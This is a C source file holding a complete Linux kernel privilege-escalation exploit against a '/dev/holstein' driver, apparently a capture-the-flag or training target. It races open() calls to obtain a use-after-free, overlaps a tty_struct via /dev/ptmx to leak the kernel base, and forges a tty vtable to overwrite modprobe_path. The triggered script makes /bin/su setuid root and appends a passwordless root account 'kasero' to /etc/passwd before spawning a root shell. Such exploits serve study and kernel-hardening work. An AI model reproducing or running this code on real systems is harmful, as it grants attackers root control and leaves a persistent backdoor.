#include <kpwn.h>
#include <struct.h>

uint64_t kbase;
uint64_t gbuf;

char buf[0x400];
int win = 0;

void *race(void *arg)
{
    while (1)
    {
        while (!win)
        {
            int fd = open("/dev/holstein", O_RDWR);
            if (fd == 4)
                win = 1;
            if (win == 0 && fd != -1)
                close(fd);
        }

        if (write(3, "A", 1) != 1 || write(4, "a", 1) != 1)
        {
            close(3);
            close(4);
            win = 0;
        }
        else
        {
            break;
        }
    }

    return NULL;
}

int main()
{
    pthread_t th1, th2;
    int ptmx;

    while (1)
    {
        pthread_create(&th1, NULL, race, NULL);
        pthread_create(&th2, NULL, race, NULL);
        pthread_join(th1, NULL);
        pthread_join(th2, NULL);
        write(3, "Hello", 5);
        read(4, buf, 5);

        if (memcmp(buf, "Hello", 5) == 0)
        {
            logOK("Sucessfully opened two fds to /dev/holstein");
            logInfo("Now for the fun part...");
            close(3); // uaf

            logInfo("Spray for ptmx");
            ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
            if (ptmx == -1)
                errExit("open ptmx");
            read(4, buf, 0x400);
            if (*(uint64_t *)&buf == 0x100005401)
            {
                logOK("Successfully overlapped with ptmx");
                break;
            }
            else
            {
                close(4);
                close(ptmx);
            }
        }
    }

    kbase = *(uint64_t *)&buf[0x18] - 0xc3afe0;
    gbuf = *(uint64_t *)&buf[0x38] - 0x38;

    logInfo("Leaked kernel base @ 0x%lx", kbase);
    logInfo("Leaked gbuf @ 0x%lx", gbuf);

    uint64_t modprobe = kbase + 0xe384c0;
    uint64_t write_gadget = kbase + 0x1b72c6;

    logInfo("modprobe @ 0x%lx", modprobe);
    logInfo("write_gadget @ 0x%lx", write_gadget);

    logInfo("Prepare fake tty_struct and vtable");
    struct tty_struct *tty = (struct tty_struct *)(buf);
    struct fake_operations_table *vtable = (struct fake_operations_table *)(buf + 0x100);

    memcpy(tty, &fake_tty, sizeof(fake_tty));
    tty->ops = (uint64_t *)(uintptr_t)(gbuf + 0x100);
    tty->driver = (uint64_t *)(uintptr_t)gbuf;
    vtable->ioctl = write_gadget;

    // hex_dump(buf, 0x400);
    write(4, buf, 0x400);
    logOK("Overwrote tty_struct");

    char path[] = "/tmp/x";
    uint32_t *p = (uint32_t *)path;

    for (size_t i = 0; i < (sizeof(path) + 3) / 4; ++i)
    {
        ioctl(ptmx, p[i], modprobe + i * 4);
    }

    logInfo("Prepare /tmp/x script and trigger modprobe");
    system("echo -e \"#!/bin/sh\nchown root:root /bin/su\nchmod u+s /bin/su\necho 'kasero::0:0:root:/:/bin/sh' >> /etc/passwd\n\" > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");

    logInfo("Tada!");
    system("su kasero; /bin/sh");

    return 0;
}
